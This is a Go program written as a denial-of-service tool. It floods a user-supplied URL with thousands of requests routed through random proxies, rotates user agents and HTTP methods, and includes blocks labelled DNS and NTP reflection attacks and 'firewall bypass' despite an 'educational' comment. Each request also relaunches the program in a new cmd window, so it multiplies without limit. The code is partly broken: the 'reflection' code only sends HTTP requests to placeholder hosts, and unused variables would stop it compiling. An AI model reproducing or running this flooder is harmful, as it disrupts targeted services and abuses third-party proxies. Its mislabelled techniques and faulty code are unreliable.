package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

var (
	successfulRequests int
	failedRequests     int
	pendingRequests    int
	serverStatus       bool
	mutex              sync.Mutex
)

func main() {
	fmt.Print("Enter the target URL: ")
	var targetURL string
	fmt.Scanln(&targetURL)

	fmt.Print("Enter the number of ports: ")
	var numPorts int
	fmt.Scanln(&numPorts)

	fmt.Print("Enter username: ")
	var username string
	fmt.Scanln(&username)

	fmt.Print("Enter password: ")
	var password string
	fmt.Scanln(&password)

	if !authenticateUser(username, password) {
		fmt.Println("Authentication failed. Exiting.")
		return
	}

	proxyFile := "proxy.txt"
	numRequests := 10000 // You can adjust this based on the system's capacity

	proxyList := loadProxyList(proxyFile)

	var wg sync.WaitGroup
	rateLimiter := time.Tick(time.Second / time.Duration(numRequests))

	for i := 0; i < numRequests; i++ {
		<-rateLimiter
		wg.Add(1)
		go makeRequest(&wg, targetURL, proxyList, numPorts)
	}

	wg.Wait()

	fmt.Printf("Successful Requests: %d\n", successfulRequests)
	fmt.Printf("Failed Requests: %d\n", failedRequests)
	fmt.Printf("Server Status: %t\n", serverStatus)
}

func authenticateUser(username, password string) bool {
	return username == "karthikraja" && password == "admin"
}

func makeRequest(wg *sync.WaitGroup, targetURL string, proxyList []string, numPorts int) {
	defer wg.Done()
	pendingRequests++

	proxy := getRandomProxy(proxyList)
	userAgent := getRandomUserAgent()
	requestURL := targetURL + getRandomRequestPath()
	payload := getRandomPayload()

	proxyURL, _ := url.Parse(proxy)
	transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
	client := &http.Client{Transport: transport}

	methods := []string{"GET", "POST", "PUT", "DELETE"}
	rand.Seed(time.Now().UnixNano())
	randomMethod := methods[rand.Intn(len(methods))]

	req, _ := http.NewRequest(randomMethod, requestURL, strings.NewReader(payload))
	req.Header.Set("User-Agent", userAgent)

	// Implement firewall bypass techniques for educational purposes
	for port := 1; port <= numPorts; port++ {
		go func(port int) {
			// Implement DNS reflection attack
			if port%2 == 0 {
				reqCopy := cloneRequest(req)
				reqCopy.URL.Host = fmt.Sprintf("vulnerable-dns-server:%d", port)
				resp, err := client.Do(reqCopy)
				if err == nil {
					// Use mutex to protect shared variables
					mutex.Lock()
					successfulRequests++
					mutex.Unlock()
				} else {
					// Use mutex to protect shared variables
					mutex.Lock()
					failedRequests++
					mutex.Unlock()
				}
			} else {
				// Implement NTP reflection attack
				reqCopy := cloneRequest(req)
				reqCopy.URL.Host = fmt.Sprintf("vulnerable-ntp-server:%d", port)
				resp, err := client.Do(reqCopy)
				if err == nil {
					// Use mutex to protect shared variables
					mutex.Lock()
					successfulRequests++
					mutex.Unlock()
				} else {
					// Use mutex to protect shared variables
					mutex.Lock()
					failedRequests++
					mutex.Unlock()
				}
			}
		}(port)
	}

	// Open CMD and launch the same attack
	go func() {
		cmd := exec.Command("cmd", "/C", "start", "cmd", "/C", "go run main.go")
		cmd.Run()
	}()

	pendingRequests--
}

func cloneRequest(r *http.Request) *http.Request {
	// Clone the request to avoid concurrent use of the same request
	reqCopy := new(http.Request)
	*reqCopy = *r
	reqCopy.Header = make(http.Header, len(r.Header))
	for k, s := range r.Header {
		reqCopy.Header[k] = append([]string(nil), s...)
	}
	return reqCopy
}

func loadProxyList(filename string) []string {
	var proxyList []string

	file, err := os.Open(filename)
	if err != nil {
		fmt.Println("Error opening proxy file:", err)
		os.Exit(1)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxyList = append(proxyList, scanner.Text())
	}

	return proxyList
}

func getRandomProxy(proxyList []string) string {
	rand.Seed(time.Now().UnixNano())
	return proxyList[rand.Intn(len(proxyList))]
}

func getRandomUserAgent() string {
	userAgents := []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"}
	rand.Seed(time.Now().UnixNano())
	return userAgents[rand.Intn(len(userAgents))]
}

func getRandomRequestPath() string {
	requestPaths := []string{"/page1", "/page2", "/page3"}
	rand.Seed(time.Now().UnixNano())
	return requestPaths[rand.Intn(len(requestPaths))]
}

func getRandomPayload() string {
	payloadSizes := []int{100, 200, 300}
	rand.Seed(time.Now().UnixNano())
	payloadSize := payloadSizes[rand.Intn(len(payloadSizes))]
	return strings.Repeat("a", payloadSize)
}
